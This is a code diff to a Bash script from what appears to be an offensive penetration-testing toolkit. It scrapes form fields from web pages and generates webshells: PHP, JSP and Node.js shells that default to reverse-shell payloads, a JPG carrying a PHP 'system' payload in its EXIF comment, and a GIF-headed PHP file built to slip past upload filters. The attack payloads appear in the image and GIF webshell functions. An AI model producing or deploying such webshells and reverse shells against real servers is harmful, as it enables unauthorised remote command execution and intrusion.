@@ -92,7 +92,7 @@ get_hidden_inputs() {
     extract_hidden_input "$page" "$target_form"
 }
 
-get_iis_hidden_inputs() {
+get_form_hidden_inputs() {
     local target_url="$1"
     local target_form="$2"
     local hidden_inputs=$(get_hidden_inputs "$target_url" "$target_form")
@@ -103,7 +103,10 @@ get_iis_hidden_inputs() {
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/ -F /g')
     hidden_inputs="-F $hidden_inputs"
-    echo $hidden_inputs
+    echo "$hidden_inputs"
+}
+get_iis_hidden_inputs() {
+    get_form_hidden_inputs "$1" "$2"
 }
 
 get_post_hidden_inputs() {
@@ -116,7 +119,7 @@ get_post_hidden_inputs() {
     fi
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
-    echo $hidden_inputs
+    echo "$hidden_inputs"
 }
 
 get_post_hidden_input_from_response() {
@@ -129,7 +132,86 @@ get_post_hidden_input_from_response() {
     fi
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
     hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
-    echo $hidden_inputs
+    echo "$hidden_inputs"
+}
+
+get_form_hidden_input_from_response() {
+    local response="$1"
+    local target_form="$2"
+    local hidden_inputs=$(extract_hidden_input "$response" "$target_form")
+    if [[ -z "$hidden_inputs" ]]; then
+        echo ""
+        return 0
+    fi
+    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
+    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/ -F /g')
+    hidden_inputs="-F $hidden_inputs"
+    echo "$hidden_inputs"
+}
+get_post_current_input_from_response() {
+    local current_input=$(extract_current_input_from_response "$1")
+    current_input=$(echo "$current_input" | sed -E 's/^,//')
+    current_input=$(echo "$current_input" | sed -E 's/,$//')
+    current_input=$(echo "$current_input" | sed -E 's/,/\&/g')
+    echo "$current_input"
+}
+
+extract_current_input_from_response() {
+    local response="$1"
+    text_input=$(echo "$response" | grep -oP '<input[^>]*type="text"[^>]*name="([^"]*)"[^>]*>')
+    IFS=$'\n'
+    local current_text_input=""
+    local current_all_inputs=""
+    local current_checkbox_input=""
+    local current_select_input=""
+    for input in $text_input; do
+        name=$(echo "$input" | grep -oP 'name="\K[^"]*')
+        value=$(echo "$input" | grep -oP 'value="\K[^"]*')
+        current_text_input+="$name=$value"$'\n'
+    done
+    current_all_inputs+="$current_text_input"
+    local checkbox_input=""
+    checkbox_input=$(echo "$response" | grep -oP '<input[^>]*type="checkbox"[^>]*name="([^"]*)"[^>]*checked="checked"[^>]*>')
+    checkbox_input=$(echo "$checkbox_input" | grep -oP 'name="\K[^"]*')
+    for checkbox in $checkbox_input; do
+        current_checkbox_input+="$checkbox=on"$'\n'
+    done
+    checkbox_input=$(echo "$response" | grep -oP '<input[^>]*type="checkbox"[^>]*name="([^"]*)"[^>]*>')
+    checkbox_input=$(echo "$checkbox_input" | grep -oP 'name="\K[^"]*')
+    current_all_inputs+="$current_checkbox_input"
+    current_select_input=$(echo "$response" | awk '
+    /<select/ { start = 1; }
+    start {
+        if (/<select/) {
+            match($0, /name="([^"]*)"/, arr)
+            select_name = arr[1]
+        }
+        if (/<option[^>]*selected="selected"/) {
+            match($0, /value="([^"]*)"[^>]*selected="selected"/, arr)
+            if (length(arr) == 0) {
+                match($0, /selected="selected"[^>]*value="([^"]*)"/, arr)
+            }
+            if (length(arr) == 0) {
+                match($0, /value=([^ ]*)[^>]*selected="selected"/, arr)
+            }
+            if (length(arr) == 0) {
+                match($0, /selected="selected"[^>]*value=([^ ]*)/, arr)
+            }
+            option_value = arr[1]
+            print select_name"="option_value
+        }
+    }
+    /<\/select>/ { start = 0 }
+    ')
+    current_all_inputs+="$current_select_input"
+    for input in $current_all_inputs; do
+        name=$(echo "$input" | cut -d= -f1)
+        value=$(echo "$input" | cut -d= -f2-)
+        name=$(urlencode "$name")
+        value=$(urlencode "$value")
+        current_all_inputs_urlencoded+="$name=$value,"        
+    done
+    echo "$current_all_inputs_urlencoded"
 }
 
 create_aspx_webshell() {
@@ -163,21 +245,23 @@ create_php_web_shell() {
 }
 
 create_php_webshell() {
-    cp $SCRIPTDIR/../php/webshell.php .
+    if [[ -z $webshell_filename ]]; then
+        webshell_filename="webshell.php"
+    fi
+    cp $SCRIPTDIR/../php/webshell.php "$webshell_filename"
     if [[ -z "$cmd" ]]; then
-        cmd=$(get_bash_reverse_shell)
-        cmd=$(encode_bash_payload "$cmd")
+        cmd=$(get_twostage_reverse_shell)
     fi
     local cmd_replacement=$(escape_sed "$cmd")
     cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
-    sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.php
+    sed -E -i "s/\{cmd\}/$cmd_replacement/g" "$webshell_filename"
     
     if [[ ! -z "$minimize_webshell" ]] && [[ "$minimize_webshell" == "true" ]]; then
-        sed -E -i '/html/d' webshell.php
-        sed -E -i '/body/d' webshell.php
-        sed -E -i '/title/d' webshell.php
-        sed -E -i '/head/d' webshell.php
-        sed -E -i '/pre/d' webshell.php
+        sed -E -i '/html/d' "$webshell_filename"
+        sed -E -i '/body/d' "$webshell_filename"
+        sed -E -i '/title/d' "$webshell_filename"
+        sed -E -i '/head/d' "$webshell_filename"
+        sed -E -i '/pre/d' "$webshell_filename"
     fi
 }
 
@@ -199,58 +283,69 @@ create_python_upload() {
 }
 
 create_jsp_webshell() {
-    cp $SCRIPTDIR/../jsp/webshell.jsp .
+    if [[ -z $webshell_filename ]]; then
+        webshell_filename="webshell.jsp"
+    fi
+    cp $SCRIPTDIR/../jsp/webshell.jsp "$webshell_filename"
     if [ -z "$cmd" ]; then
         reverse_type="java_exec"
         cmd=$(get_bash_reverse_shell)
     fi
     local cmd_replacement=$(escape_sed "$cmd")
     cmd_replacement=$(echo $cmd_replacement| sed -E s'/"/\\\\"/g')
-    sed -E -i "s/\{cmd\}/$cmd_replacement/g" webshell.jsp
+    sed -E -i "s/\{cmd\}/$cmd_replacement/g" "$webshell_filename"
     
     if [[ ! -z "$minimize_webshell" ]] && [[ "$minimize_webshell" == "true" ]]; then
-        sed -E -i '/html/d' webshell.jsp
-        sed -E -i '/body/d' webshell.jsp
-        sed -E -i '/title/d' webshell.jsp
-        sed -E -i '/head/d' webshell.jsp
-        sed -E -i '/pre/d' webshell.jsp
-        sed -E -i '/h1/d' webshell.jsp
+        sed -E -i '/html/d' "$webshell_filename"
+        sed -E -i '/body/d' "$webshell_filename"
+        sed -E -i '/title/d' "$webshell_filename"
+        sed -E -i '/head/d' "$webshell_filename"
+        sed -E -i '/pre/d' "$webshell_filename"
+        sed -E -i '/h1/d' "$webshell_filename"
     fi
 }
 
 create_image_webshell() {
-    cp $SCRIPTDIR/../images/blank.jpg .
+    if [[ -z $webshell_filename ]]; then
+        webshell_filename="webshell.php.jpg"
+    fi
+    cp $SCRIPTDIR/../images/blank.jpg "$webshell_filename"
+
     local command=""
     if [[ -z "$cmd" ]]; then
         command="\$_GET[\"cmd\"]"
     else
         command="'$cmd'"
     fi
-    exiftool -Comment="<?php system($command); ?>" blank.jpg
-    mv blank.jpg webshell.php.jpg
+    exiftool -Comment="<?php system($command); ?>" "$webshell_filename"
 }
 
 create_image_gif_webshell() {
+    if [[ -z $webshell_filename ]]; then
+        webshell_filename="webshell.php"
+    fi
     local command=""
     if [[ -z "$cmd" ]]; then
         command="\$_GET[\"cmd\"]"
     else
         command="'$cmd'"
     fi
-    echo -e "GIF89a;\n<?php system($command); ?>" > webshell.php
-
+    echo -e "GIF89a;\n<?php system($command); ?>" > "$webshell_filename"
 }
 
 
 create_nodejs_webshell() {
-    cp $SCRIPTDIR/../js/node.js .
+    if [[ -z $webshell_filename ]]; then
+        webshell_filename="node.js"
+    fi
+    cp $SCRIPTDIR/../js/node.js "$webshell_filename"
     if [[ -z "$cmd" ]]; then
         cmd=$(get_bash_reverse_shell)
         encode_ifss=true
         cmd=$(encode_bash_payload "$cmd")
     fi
     local cmd_replacement=$(escape_sed "$cmd")
-    sed -E -i "s/\{command\}/$cmd_replacement/g" node.js
+    sed -E -i "s/\{command\}/$cmd_replacement/g" "$webshell_filename"
 
 }
 
